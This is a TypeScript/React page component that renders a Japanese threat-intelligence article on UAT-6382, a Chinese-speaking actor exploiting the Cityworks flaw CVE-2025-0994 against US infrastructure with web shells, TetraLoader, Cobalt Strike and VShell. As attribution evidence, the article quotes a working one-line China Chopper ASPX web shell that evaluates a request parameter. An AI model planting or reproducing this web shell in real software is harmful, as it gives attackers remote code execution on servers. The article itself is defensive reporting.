// MarkdownをHTMLに変換する簡易パーサー
function parseMarkdown(markdown: string): string {
  let html = markdown.trim().replace(/</g, '&lt;').replace(/>/g, '&gt;');
  html = html.replace(/!\[(.*?)\]\((.*?)\)/g, '<img src="$2" alt="$1" class="my-6 rounded-lg shadow-md mx-auto" />');
  html = html.replace(/^## (.*$)/gim, '<h2 class="text-2xl font-bold mt-10 mb-4 border-l-4 border-blue-500 pl-4">$1</h2>');
  html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
  html = html.replace(/`([^`]+)`/g, '<code class="bg-gray-200 text-red-600 font-mono px-1 rounded-sm">$1</code>');
  html = html.replace(/```([\s\S]*?)```/g, '<pre class="bg-gray-800 text-white p-4 rounded-md overflow-x-auto my-6"><code>$1</code></pre>');
  html = html.replace(/\n/g, '<br />');
  // 特定のタグ内で不要な<br />が生成されるのを防ぐ簡易的な後処理
  html = html.replace(/<h2(.*?)<br \/>/g, '<h2$1').replace(/<pre(.*?)<br \/>/g, '<pre$1');
  return html;
}

// 記事データ
const article = {
  id: 2, 
  title: '中国の脅威アクターUAT-6382による米国重要インフラへの侵入(Trimble Cityworks、CVE-2025-0994)',
  date: '2025-07-09',
  tags: ['#脅威インテリジェンス', '#CTI'],
  content: `## はじめに\n\n米国の地方自治体や公共事業体が利用する資産管理ソフトウェア「Trimble Cityworks」に存在するゼロデイ脆弱性（CVE-2025-0994）を悪用し、中国語話者の脅威アクター「UAT-6382」が米国の重要インフラへ侵入していることが明らかになった。\n\nこの攻撃は、単なるデータ窃取に留まらず、将来的な破壊活動のための「事前準備」の可能性を強く示唆しており、地政学的な観点からも極めて深刻な事案だと言える。本稿では、Cisco TalosやField Effectなどのレポートを基に、この攻撃キャンペーンの技術的な詳細と、その背景にある脅威について解説する。\n\n## 攻撃の概要とTTPs\n\n今回の攻撃キャンペーンは、以下の流れで実行される。\n\n1.  **初期アクセス**: 攻撃者は、Cityworksに存在するデシリアライゼーションの脆弱性（CVE-2025-0994）を悪用し、標的のMicrosoft IISウェブサーバー上でリモートから任意のコードを実行する。\n2.  **偵察とWebシェルの展開**: 侵入後、攻撃者は直ちに偵察活動を開始し、サーバーの構成やファイルシステムを調査する。その後、持続的なアクセスのために複数のWebシェル（AntSword, China Chopperなど）を迅速に展開する。これらのWebシェルは、中国系のAPTグループが多用することで知られている。\n3.  **ペイロードの投下**: Webシェルを足がかりに、攻撃者はカスタムメイドのマルウェアローダー「TetraLoader」を送り込む。\n4.  **最終ペイロードの実行**: TetraLoaderは、メモリ内でCobalt Strikeビーコンや「VShell」と呼ばれるGo言語で書かれたRAT（Remote Access Trojan）を展開し、攻撃者はC2サーバーを通じて遠隔操作を可能にする。\n\nこの一連の流れは、攻撃者が明確な目的を持って、迅速かつ効率的に侵害を拡大していく様子を示している。\n\n## 中国との繋がりを示す「決定的証拠」：MaLoader\n\n今回の攻撃が中国語話者の脅威アクターによるものだと強く確信させる証拠が、ペイロードローダーの「TetraLoader」だ。\n\nCisco Talosの分析によれば、このTetraLoaderは「MaLoader」と呼ばれるマルウェアビルダーフレームワークを用いて作成されている。驚くべきことに、この**MaLoaderは簡体字中国語で書かれており**、そのビルダーのGUIも完全に中国語だ。\n\nCisco Talosのブログでは、MaLoaderのビルダーインターフェースのスクリーンショットが公開されている。そこには、「上线心跳包间隔时间(秒)」(オンラインハートビート間隔(秒)) や「进程注入」(プロセスインジェクション)、「内存执行」(メモリ実行) といった設定項目が並んでおり、このツールが中国語話者の手によって開発・使用されていることを明確に物語っている。\n\n![MaLoaderのビルダーインターフェース](https://gblogs.cisco.com/jp/wp-content/uploads/2025/06/25-06-02-talos-uat-6382-exploits-cityworks-vulnerability-fig2.png)\n\nこのようなオープンな証拠が残っている点は興味深い。高度なAPTグループであれば、言語的な痕跡を消すことが多い。UAT-6382が、GitHubで公開されていた中国語のツールをあえて利用したのか、あるいは開発者コミュニティの一部なのかは不明だが、中国との関連を裏付ける強力なインジケーターであることは間違いない。\n\nさらに、彼らが使用するWebシェルの一部には、以下のような中国語のメッセージが含まれていたことも報告されている。\n\n\`\`\`\n<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>\n/*\n#  中国菜刀  #\n#   AUTHOR: dRUnkeRS_zY\n#   SITE: www.rootkit.net.cn\n#   MAIL: dRUnkeRS_zY@126.com\n*/\n\`\`\`\n「中国菜刀 (China Chopper)」という有名なWebシェルの名が記されており、これも状況証拠の一つとなる。\n\n## 地政学的インプリケーション：これは「来るべき日」への備えか\n\nUAT-6382の攻撃対象は、米国の地方自治体や公共事業体、特に電力や水道といったライフラインを管理する組織だ。\n\nField Effectの分析によれば、このような攻撃は、市民の個人情報、法執行機関のデータ、インフラ関連の機密情報を収集し、スパイ活動や影響力工作に利用する目的がある。\n\nしかし、より深刻なのは、これが将来の紛争を見据えた**「事前準備（pre-positioning）」**である可能性だ。平時のうちに重要インフラのネットワークに潜伏し、制御システムへのアクセス経路を確保しておく。そして、有事の際（例えば、台湾を巡る紛争など）に、これらのアクセスを行使して社会インフラを麻痺させ、米国内に混乱を引き起こす。\n\nこれは、米サイバーセキュリティ・インフラストラクチャセキュリティ庁（CISA）が、中国の国家支援型APT「Volt Typhoon」などに対して繰り返し警告してきたシナリオそのものである。\n\n## まとめ\n\nUAT-6382による今回の攻撃は、簡体字中国語で書かれたマルウェアビルダー「MaLoader」という動かぬ証拠と共に、中国を背景に持つ脅威アクターが米国の重要インフラを虎視眈々と狙っている現実を突きつけている。\n\n脆弱なソフトウェアを的確に狙い、迅速に侵入を拡大し、長期的な潜伏を試みる彼らの手口は洗練されている。これはもはや単なるサイバー犯罪ではなく、国家の安全保障を揺るがす地政学的な脅威だ。我々は、このような「静かな侵略」が、見えないところで常に行われているという事実を認識し、防御を固め続ける必要がある。`,
  sources: [
      { title: 'Cisco Talos: UAT-6382 exploits Cityworks zero-day vulnerability to deliver malware', url: 'https://blog.talosintelligence.com/uat-6382-exploits-cityworks-vulnerability/' },
      { title: 'Cisco Japan Blog: UAT-6382 が Cityworks のゼロデイ脆弱性を悪用してマルウェアを配信', url: 'https://gblogs.cisco.com/jp/2025/06/talos-uat-6382-exploits-cityworks-vulnerability/' },
      { title: 'Field Effect: China-linked threat actor breaches government networks with Trimble flaw', url: 'https://fieldeffect.com/blog/china-linked-threat-actor-breaches-government-networks-with-trimble-flaw' },
      { title: 'StateScoop: Report: Chinese hackers used Cityworks vulnerability to deliver malware', url: 'https://statescoop.com/chinese-hackers-cityworks-vulnerability-malware-2025/' },
      { title: 'NVD: CVE-2025-0994 Detail', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-0994' },
      { title: 'CISA: Trimble Cityworks (Update A)', url: 'https://www.cisa.gov/news-events/ics-advisories/icsa-25-037-04' },
      { title: 'Authentic8: Cyber Intel Brief: Ransomware gangs and zero-day vulnerabilities', url: 'https://www.authentic8.com/blog/cyber-intel-brief-ransomware-gangs-and-zero-day-vulnerabilities' },
      { title: 'Broadcom: TetraLoader distributed in the UAT-6382 campaign', url: 'https://www.broadcom.com/support/security-center/protection-bulletin/tetraloader-distributed-in-the-uat-6382-campaign' }
  ]
};

export default function Article2Page() {
  const parsedContent = parseMarkdown(article.content);

  return (
    <article className="bg-white p-4 sm:p-8 rounded-lg shadow-md">
      <div className="prose lg:prose-xl max-w-none">
        <h1 className="text-3xl sm:text-4xl font-extrabold mb-4">{article.title}</h1>
        <div className="mb-8 text-gray-500 flex items-center flex-wrap">
          <span className="mr-4">公開日: {article.date}</span>
          <div className="flex gap-2 flex-wrap">
            {article.tags.map(tag => (
              <span key={tag} className="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700">{tag}</span>
            ))}
          </div>
        </div>
        <div className="text-lg leading-relaxed" dangerouslySetInnerHTML={{ __html: parsedContent }} />
        {article.sources && (
          <section className="mt-12 pt-6 border-t">
            <h2 className="text-2xl font-bold mb-4">参考文献・ソース</h2>
            <ul className="list-disc pl-5 space-y-2">
              {article.sources.map((source, index) => (
                <li key={index}>
                  <a href={source.url} target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">{source.title}</a>
                </li>
              ))}
            </ul>
          </section>
        )}
      </div>
    </article>
  );
}
